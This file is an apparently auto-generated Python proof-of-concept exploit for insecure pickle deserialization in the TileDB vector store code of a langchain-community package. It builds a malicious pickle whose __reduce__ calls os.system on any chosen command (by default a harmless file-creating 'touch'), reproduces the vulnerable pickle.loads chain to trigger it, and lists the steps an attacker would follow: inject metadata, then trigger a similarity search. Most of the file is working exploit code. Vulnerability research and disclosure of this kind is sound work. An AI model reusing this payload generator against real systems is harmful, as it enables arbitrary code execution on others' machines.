#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-025
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in langchain-community-only
TileDB vector store.

Vulnerability: The process_index_results function in tiledb.py uses pickle.loads()
on metadata retrieved from a TileDB array without validation. If an attacker can
control the metadata stored in the database (e.g., through a separate ingestion
endpoint), they can achieve remote code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle payload that executes a benign command
2. Simulating the deserialization that occurs in process_index_results
3. Showing that arbitrary code execution is possible

WARNING: This is for educational/authorized testing purposes only.
"""

import pickle
import os
import sys
import struct
import numpy as np
from typing import Optional


def create_malicious_payload(command: str = "touch /tmp/poc_success.txt") -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Args:
        command: The command to execute (default: benign touch command)
    
    Returns:
        bytes: The pickle payload
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPayload())


def simulate_tiledb_deserialization(pickled_data: bytes) -> Optional[dict]:
    """
    Simulate the exact deserialization process used in process_index_results.
    
    The original code does:
    pickled_metadata = doc.get("metadata")
    if pickled_metadata is not None:
        metadata = pickle.loads(
            np.array(pickled_metadata.tolist()).astype(np.uint8).tobytes()
        )
    
    Args:
        pickled_data: The raw pickle bytes
    
    Returns:
        Optional[dict]: The deserialized metadata (or None if error)
    """
    # Simulate how TileDB stores the data (as numpy array of uint8)
    # The original code converts to list, then back to numpy array
    pickled_array = np.frombuffer(pickled_data, dtype=np.uint8)
    
    # Simulate the exact conversion chain from the vulnerable code
    # doc.get("metadata") returns a numpy array
    # .tolist() converts to Python list
    # np.array(...).astype(np.uint8) converts back to numpy array
    # .tobytes() gets the raw bytes
    # pickle.loads() deserializes
    reconstructed_bytes = np.array(pickled_array.tolist()).astype(np.uint8).tobytes()
    
    # This is the vulnerable pickle.loads() call
    metadata = pickle.loads(reconstructed_bytes)
    return metadata


def main():
    """Main exploit demonstration."""
    
    print("[*] TileDB Insecure Deserialization PoC")
    print("[*] ====================================")
    print()
    
    # Step 1: Create malicious payload
    print("[*] Step 1: Creating malicious pickle payload...")
    
    # Benign command - creates a file to prove code execution
    benign_command = "touch /tmp/poc_success.txt"
    malicious_payload = create_malicious_payload(benign_command)
    
    print(f"[*] Payload size: {len(malicious_payload)} bytes")
    print(f"[*] Command to execute: {benign_command}")
    print()
    
    # Step 2: Show the payload structure
    print("[*] Step 2: Payload structure (first 50 bytes):")
    print(f"    {malicious_payload[:50].hex()}")
    print()
    
    # Step 3: Simulate the vulnerable deserialization
    print("[*] Step 3: Simulating vulnerable deserialization...")
    print("[*] This is exactly what process_index_results does:")
    print("[*]   pickle.loads(np.array(pickled_metadata.tolist()).astype(np.uint8).tobytes())")
    print()
    
    try:
        # This will execute the command during deserialization
        result = simulate_tiledb_deserialization(malicious_payload)
        print(f"[*] Deserialization completed successfully")
        print(f"[*] Result object: {result}")
        
        # Check if the command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt created.")
            print("[+] This proves arbitrary code execution is possible.")
        else:
            print("[!] Command may have executed but file not found (check permissions)")
            
    except Exception as e:
        print(f"[!] Error during deserialization: {e}")
        print("[!] This may indicate the payload structure needs adjustment")
        sys.exit(1)
    
    print()
    print("[*] Step 4: Cleanup")
    # Remove the proof file
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up /tmp/poc_success.txt")
    
    print()
    print("[*] Exploit demonstration complete.")
    print("[*] In a real attack scenario, an attacker would:")
    print("[*]   1. Inject malicious metadata into the TileDB database")
    print("[*]   2. Trigger similarity_search_with_relevance_scores()")
    print("[*]   3. The pickle.loads() in process_index_results() executes the payload")


if __name__ == "__main__":
    main()
